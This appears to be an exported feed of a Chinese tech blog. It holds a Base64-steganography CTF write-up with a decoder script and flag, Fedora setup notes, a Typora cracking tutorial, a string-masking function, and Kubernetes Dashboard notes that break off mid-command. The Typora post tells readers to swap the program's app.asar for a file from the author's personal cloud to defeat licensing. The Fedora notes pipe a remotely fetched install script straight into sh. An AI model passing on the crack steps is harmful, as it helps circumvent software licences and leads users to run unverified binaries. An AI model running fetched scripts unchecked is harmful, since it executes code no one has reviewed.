class="line">SUNBZ0lDQWdJQ0JwWmloNElEMDlJQ0l4SWlBbUppQjVJRDA5SUNJeElpa0sN</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ2NtVjBkWEp1SUNJeElqc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JsYkhObENnPT0N</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ2NtVjBkWEp1SUNJd0lpQTdDZz09DQ==</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">SUNBZ0lDOHZjSEpwYm5SbUtDSWxaQzB0SldSY2JpSXNiR1Z1ZUN4c1pXNTVLVHNLDQ==</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCaExDQmlMQ0JqTEdRN0NnPT0N</span><br><span class="line">SUNBZ0lHRWdQU0I0TG5OMVluTjBjaWd3TENCc1pXNTRMeklwT3dvPQ0=</span><br><span class="line">SUNBZ0lHSWdQU0I0TG5OMVluTjBjaWhzWlc1NEx6SXNJR3hsYm5ndk1pazdDZz09DQ==</span><br><span class="line">SUNBZ0lHTWdQU0I1TG5OMVluTjBjaWd3TENCc1pXNTVMeklwT3dvPQ0=</span><br><span class="line">SUNBZ0lHUWdQU0I1TG5OMVluTjBjaWhzWlc1NUx6SXNJR3hsYm5rdk1pazdDZz09DQ==</span><br><span class="line">SUNBZ0lIQnlhVzUwWmlnaUpXUXRMU1ZrTFMwbFpDMHRKV1F0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMU1ZrTFNWa1hHNGlMR0V1YzJsNlpTZ3BMQ0JpTG5OcGVtVW9LU3dnWXk1emFYcGxLQ2tzSUdRdWMybDZaU2dwTENCNExuTnBlbVVvS1N3Z2VTNXphWHBsS0NrcE93bz0N</span><br><span class="line">SUNBZ0lDOHZZMjkxZER3OGVEdzhJam9pUER4aFBEd2lJQ0k4UEdJOFBDSWdJanc4WXp3OElpQWlQRHhrUER4bGJtUnNPd289DQ==</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCaFl5QTlJRzExYkNoaExDQmpLVHNLDQ==</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCaVpDQTlJRzExYkNoaUxDQmtLVHNLDQ==</span><br><span class="line">SUNBZ0lDOHZZMjkxZER3OGVEdzhJam9pUER4aFl6dzhJaUFpUER4aVpEdzhaVzVrYkRzSw0=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCaFlpQTlJRzFwYm5Vb1lTd2dZaWs3THk5aExXSUsN</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCalpDQTlJRzFwYm5Vb1pDd2dZeWs3Q2c9PQ0=</span><br><span class="line">SUNBZ0lDOHZZMjkxZER3OGVEdzhJam9pUER4aFlqdzhJaUFpUER4alpEdzhaVzVrYkRzSw0=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCaFltTmtJRDBnYlhWc0tHRmlMQ0JqWkNrN0NnPT0N</span><br><span class="line">SUNBZ0lDOHZZMjkxZER3OGVEdzhJam9pUER4aFltTmtQRHhsYm1Sc093bz0N</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCbWFYSnpkQ0E5SUdGak93bz0N</span><br><span class="line">SUNBZ0lHWnZjaWhwYm5RZ2FTQTlJREE3SUdrZ1BDQW9iR1Z1ZUNrN0lHa3JLeWtLDQ==</span><br><span class="line">SUNBZ0lDQWdJQ0JtYVhKemRDQXJQU0FpTUNJN0NnPT0N</span><br><span class="line">SUNBZ0lDOHZZMjkxZER3OFlXTThQQ0lnTFMwdExTMWhZeTB0TFMwZ0lqdzhabWx5YzNROFBHVnVaR3c3Q2c9PQ0=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCelpXTnZibVFnUFNCaFpHUW9ZV0pqWkN3Z1lXTXBPd289DQ==</span><br><span class="line">SUNBZ0lITmxZMjl1WkNBOUlHRmtaQ2h6WldOdmJtUXNJR0prS1RzSw0=</span><br><span class="line">SUNBZ0lHWnZjaWhwYm5RZ2FTQTlJREE3SUdrZ1BDQW9iR1Z1ZUM4eUtUc2dhU3NyS1FvPQ0=</span><br><span class="line">SUNBZ0lDQWdJQ0J6WldOdmJtUWdLejBnSWpBaU93bz0N</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCbWFXNGdQU0JoWkdRb1ptbHljM1FzSUhObFkyOXVaQ2s3Q2c9PQ0=</span><br><span class="line">SUNBZ0lISmxkSFZ5YmlCaFpHUW9abWx1TENCaVpDazdDZz09DQ==</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">ZlFvPQ0=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">YVc1MElHMWhhVzRvZG05cFpDa0sN</span><br><span class="line">ZXdvPQ0=</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCNExDQjVPd289DQ==</span><br><span class="line">SUNBZ0lIQnlhVzUwWmlnaTZLKzM2TDZUNVlXbDVMaWs1TGlxNUxxTTZMK2I1WWkyNXBXdzVhMlhPaUFpS1RzSw0=</span><br><span class="line">SUNBZ0lHTnBiajQrZUQ0K2VUc0sN</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCaGJuTWdQU0J0ZFd3b2VDd2dlU2s3Q2c9PQ0=</span><br><span class="line">SUNBZ0lHTnZkWFE4UEdGdWN6c0sN</span><br><span class="line">ZlFvPQ0=</span><br></pre></td></tr></table></figure><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>使用Base64脚本一把梭：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deStego</span>(<span class="params">stegoFile</span>):</span><br><span class="line">    b64table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(stegoFile,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> stegoText:</span><br><span class="line">        message = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stegoText:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = line[line.index(<span class="string">&quot;=&quot;</span>) - <span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">                message += <span class="string">&quot;&quot;</span>.join([ <span class="built_in">bin</span>( <span class="number">0</span> <span class="keyword">if</span> i == <span class="string">&#x27;=&#x27;</span> <span class="keyword">else</span> b64table.find(i))[<span class="number">2</span>:].zfill(<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text])[<span class="number">2</span> <span class="keyword">if</span> text.count(<span class="string">&#x27;=&#x27;</span>) ==<span class="number">2</span> <span class="keyword">else</span> <span class="number">4</span>:<span class="number">6</span>]  </span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(message[i:i+<span class="number">8</span>],<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(deStego(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(deStego(<span class="string">&quot;stego.txt&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 deSteg.py ComeOn\!.txt</span><br></pre></td></tr></table></figure><p>得到flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220930235120525.png" alt="image-20220930235120525"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Misc </tag>
            
            <tag> QSNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次安装Fedora</title>
      <link href="/2022/09/10/cc0910243dd9-q1jun/"/>
      <url>/2022/09/10/cc0910243dd9-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="记录一次安装Fedora"><a href="#记录一次安装Fedora" class="headerlink" title="记录一次安装Fedora"></a>记录一次安装Fedora</h2><p>Fedora是一个Linux发行版，是一款由全球社区爱好者构建的面向日常应用的快速、稳定、强大的操作系统。它允许任何人自由地使用、修改和重发布，目标是创建一套新颖、多功能并且自由的操作系统。</p><h3 id="0x01-官网下载Fedora系统镜像文件"><a href="#0x01-官网下载Fedora系统镜像文件" class="headerlink" title="0x01 官网下载Fedora系统镜像文件"></a>0x01 官网下载Fedora系统镜像文件</h3><p>官网：<a target="_blank" rel="noopener" href="https://getfedora.org/">Fedora (getfedora.org)</a></p><p>点击：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910111720142.png" alt="image-20220910111720142"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910111740868.png" alt="image-20220910111740868"></p><p>等待下载完成。</p><h3 id="0x02-通过VMware虚拟机进行安装"><a href="#0x02-通过VMware虚拟机进行安装" class="headerlink" title="0x02 通过VMware虚拟机进行安装"></a>0x02 通过VMware虚拟机进行安装</h3><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910111833164.png" alt="image-20220910111833164"></p><p>根据过程一步步安装完成即可。</p><h3 id="0x03-更换软件源地址"><a href="#0x03-更换软件源地址" class="headerlink" title="0x03 更换软件源地址"></a>0x03 更换软件源地址</h3><p>进入yum源的存储文件，进行备份和替换。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum.repos.d/fedora.repo /etc/yum.repos.d/fedora.repo.backup</span><br><span class="line">mv /etc/yum.repos.d/fedora-updates.repo /etc/yum.repos.d/fedora-updates.repo.backup</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/fedora-updates.repo http://mirrors.aliyun.com/repo/fedora-updates.repo</span><br><span class="line">wget -O /etc/yum.repos.d/fedora.repo http://mirrors.aliyun.com/repo/fedora.repo</span><br></pre></td></tr></table></figure><p>更新yum缓存，使更改失效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure><blockquote><p>以上命令在root用户下使用，非root用户请在命令前添加sudo。</p></blockquote><h3 id="0x04-更新系统文件和软件"><a href="#0x04-更新系统文件和软件" class="headerlink" title="0x04 更新系统文件和软件"></a>0x04 更新系统文件和软件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum upgrade &amp;&amp; yum update</span><br></pre></td></tr></table></figure><p>更换了源之后，下载软件跟拉屎一样流畅。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910112539522.png" alt="image-20220910112539522"></p><h3 id="0x05-使用zsh终端"><a href="#0x05-使用zsh终端" class="headerlink" title="0x05 使用zsh终端"></a>0x05 使用zsh终端</h3><p>安装 <code>zsh</code> 终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y zsh</span><br></pre></td></tr></table></figure><p>查看当前终端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure><p>查看已有终端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910113058184.png" alt="image-20220910113058184"></p><p>更换终端为<code>zsh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh -s /bin/zsh</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910113408484.png" alt="image-20220910113408484"></p><p>重新登入后生效，或者直接输入<code>zsh</code>切换终端。</p><h3 id="0x06-安装Oh-my-zsh美化终端"><a href="#0x06-安装Oh-my-zsh美化终端" class="headerlink" title="0x06 安装Oh my zsh美化终端"></a>0x06 安装Oh my zsh美化终端</h3><p>安装<code>git</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y git</span><br></pre></td></tr></table></figure><p>安装<code>oh my zsh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure><p>出现以下选项：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910115545042.png" alt="image-20220910115545042"></p><p>输入<code>Y</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910115649477.png" alt="image-20220910115649477"></p><p>安装完成。</p><p>查看<code>oh my zsh</code>现有主题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.oh-my-zsh/themes</span><br><span class="line">ls -h</span><br></pre></td></tr></table></figure><p>查看<code>oh my zsh</code>配置文件<code>.zshrc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910120004680.png" alt="image-20220910120004680"></p><p>修改此处即可更换主题。</p><p>在其中找到<code>plugin</code>字段，可以进行添加插件：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910120343933.png" alt="image-20220910120343933"></p><p>下载插件<code>zsh-syntax-highlighting</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><p>下载插件<code>zsh-autosuggestions</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>在<code>.zshrc</code>添加我常用的几个插件</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910120518365.png" alt="image-20220910120518365"></p><p>应用更改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910121424455.png" alt="image-20220910121424455"></p><p>完成！</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora安装和破解教程</title>
      <link href="/2022/09/10/759381d60bc2-q1jun/"/>
      <url>/2022/09/10/759381d60bc2-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="Typora安装和破解教程"><a href="#Typora安装和破解教程" class="headerlink" title="Typora安装和破解教程"></a>Typora安装和破解教程</h2><blockquote><p>Typora下载：<a target="_blank" rel="noopener" href="https://cloud.q1jun.cn/s/ObCr">Typora_0.11.18.exe - Q1jun Cloud</a></p><p>替换文件：<a target="_blank" rel="noopener" href="https://cloud.q1jun.cn/s/aLiy">TyporaApp.zip - Q1jun Cloud</a></p></blockquote><h3 id="1-安装Typora-0-11-18版本-仅支持"><a href="#1-安装Typora-0-11-18版本-仅支持" class="headerlink" title="1. 安装Typora_0.11.18版本(仅支持)"></a>1. 安装Typora_0.11.18版本(仅支持)</h3><p>从我给的链接下载安装包进行安装。</p><p>安装成功后会提示报错，需要下载新的版本，直接无视并关闭页面进入下一步。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220909235453110.png" alt="image-20220909235453110"></p><h3 id="2-替换文件进行破解"><a href="#2-替换文件进行破解" class="headerlink" title="2. 替换文件进行破解"></a>2. 替换文件进行破解</h3><p>下载第二个链接中的压缩包<code>TyporaApp.zip</code>,将其中2099文件夹中的文件<code>app.asar</code>替换掉安装Typora文件夹中的<code>\Typora\resources\app.asar</code>文件。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220909235826341.png" alt="image-20220909235826341"></p><p>提取出来：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220909235849519.png" alt="image-20220909235849519"></p><p>找到Typora的安装文件夹：</p><blockquote><p>方法：安装完<code>Typora</code>后在桌面会有图标，右击图标，点击<kbd>打开文件位置</kbd>，找到安装的具体目录。（如果还是快捷方式，则重复本步骤）</p></blockquote><p>找到<code>app.asar</code>文件，并将其用压缩包中的文件替换。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/img/image-20220910000139086.png" alt="image-20220910000139086"></p><h3 id="3-打开Typora，完成安装和破解"><a href="#3-打开Typora，完成安装和破解" class="headerlink" title="3. 打开Typora，完成安装和破解"></a>3. 打开Typora，完成安装和破解</h3><p>重新打开Typora，完成破解安装。</p><p>本教程仅供参考学习，请勿用作商业用途！</p>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>敏感信息脱敏函数</title>
      <link href="/2022/09/08/e50cd82e9e0d-q1jun/"/>
      <url>/2022/09/08/e50cd82e9e0d-q1jun/</url>
      
        <content type="html"><![CDATA[<blockquote><p>给敏感字符串进行替换中间部分，从而达到脱敏的效果。代码如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">HideMid</span>(<span class="params">str1, count: <span class="built_in">int</span>, fix=<span class="string">&#x27;*&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       #隐藏/脱敏 中间几位</span></span><br><span class="line"><span class="string">       str 字符串</span></span><br><span class="line"><span class="string">       count 隐藏位数</span></span><br><span class="line"><span class="string">       fix 替换符号</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> str1:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="built_in">int</span>(count)</span><br><span class="line">    str_len = <span class="built_in">len</span>(str1)</span><br><span class="line">    ret_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> str_len == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> str1</span><br><span class="line">    <span class="keyword">elif</span> str_len == <span class="number">2</span>:</span><br><span class="line">        ret_str = str1[<span class="number">0</span>] + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> count == <span class="number">1</span>:</span><br><span class="line">        mid_pos = <span class="built_in">int</span>(str_len / <span class="number">2</span>)</span><br><span class="line">        ret_str = str1[:mid_pos] + fix + str1[mid_pos + <span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> str_len - <span class="number">2</span> &gt; count:</span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> str_len % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    ret_str = str1[:<span class="built_in">int</span>(str_len / <span class="number">2</span> - count / <span class="number">2</span>)] + \</span><br><span class="line">                        count * fix + str1[<span class="built_in">int</span>(str_len / <span class="number">2</span> + count / <span class="number">2</span>):]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ret_str = str1[:<span class="built_in">int</span>((str_len + <span class="number">1</span>) / <span class="number">2</span> - count / <span class="number">2</span>)] + count * fix + str1[<span class="built_in">int</span>((</span><br><span class="line">                        str_len + <span class="number">1</span>) / <span class="number">2</span> + count / <span class="number">2</span>):]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> str_len % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    ret_str = str1[:<span class="built_in">int</span>(str_len / <span class="number">2</span> - (count - <span class="number">1</span>) / <span class="number">2</span>)] + count * fix + str1[<span class="built_in">int</span>(str_len / <span class="number">2</span> + (</span><br><span class="line">                        count + <span class="number">1</span>) / <span class="number">2</span>):]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ret_str = str1[:<span class="built_in">int</span>((str_len + <span class="number">1</span>) / <span class="number">2</span> - (count + <span class="number">1</span>) / <span class="number">2</span>)] + count * fix + str1[</span><br><span class="line">                        <span class="built_in">int</span>((str_len + <span class="number">1</span>) / <span class="number">2</span> + (</span><br><span class="line">                            count - <span class="number">1</span>) / <span class="number">2</span>):]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret_str = str1[<span class="number">0</span>] + fix * (str_len - <span class="number">2</span>) + str1[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_str</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 10</title>
      <link href="/2022/07/18/6ccf848c4857-q1jun/"/>
      <url>/2022/07/18/6ccf848c4857-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="10-DashBoard"><a href="#10-DashBoard" class="headerlink" title="10. DashBoard"></a>10. DashBoard</h1><p>之前在kubernetes中完成的所有操作都是通过命令行工具kubectl完成的。其实，为了提供更丰富的用户体验，kubernetes还开发了一个基于web的用户界面（Dashboard）。用户可以使用Dashboard部署容器化的应用，还可以监控应用的状态，执行故障排查以及管理kubernetes中各种资源。</p><h2 id="10-1-部署Dashboard"><a href="#10-1-部署Dashboard" class="headerlink" title="10.1 部署Dashboard"></a>10.1 部署Dashboard</h2><ol><li>下载yaml，并运行Dashboard</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载yaml</span></span><br><span class="line">[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改kubernetes-dashboard的Service类型</span></span><br><span class="line">kind: Service</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort  # 新增</span><br><span class="line">  ports:</span><br><span class="line">    - port: 443</span><br><span class="line">      targetPort: 8443</span><br><span class="line">      nodePort: 30009  # 新增</span><br><span class="line">  selector:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f recommended.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看namespace下的kubernetes-dashboard下的资源</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard</span><br><span class="line">NAME                                            READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     Running   0          111s</span><br><span class="line">pod/kubernetes-dashboard-56484d4c5-z95z5        1/1     Running   0          111s</span><br><span class="line"></span><br><span class="line">NAME                               TYPE       CLUSTER-IP      EXTERNAL-IP  PORT(S)         AGE</span><br><span class="line">service/dashboard-metrics-scraper  ClusterIP  10.96.89.218    &lt;none&gt;       8000/TCP        111s</span><br><span class="line">service/kubernetes-dashboard       NodePort   10.104.178.171  &lt;none&gt;       443:30009/TCP   111s</span><br></pre></td></tr></table></figure><p>2）创建访问账户，获取token</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建账号</span></span><br><span class="line">[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">授权</span></span><br><span class="line">[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取账号token</span></span><br><span class="line">[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep 